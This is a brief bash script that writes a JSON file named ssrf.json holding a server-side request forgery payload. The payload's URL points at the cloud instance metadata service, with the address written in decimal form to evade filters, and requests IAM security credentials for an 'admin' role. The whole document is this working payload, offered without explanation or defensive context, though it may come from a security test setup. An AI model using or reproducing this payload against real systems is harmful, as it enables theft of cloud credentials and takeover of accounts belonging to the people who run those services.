#!/bin/bash
set -e
OUT_DIR="${OUT_DIR:-/src}"
if ! mkdir -p "$OUT_DIR" 2>/dev/null; then OUT_DIR="."; fi
export OUT_DIR
cat > "$OUT_DIR/ssrf.json" <<'EOF'
{"url":"http://2852039166/latest/meta-data/iam/security-credentials/admin","headers":{"X-aws-ec2-metadata-token":"optional"}}
EOF
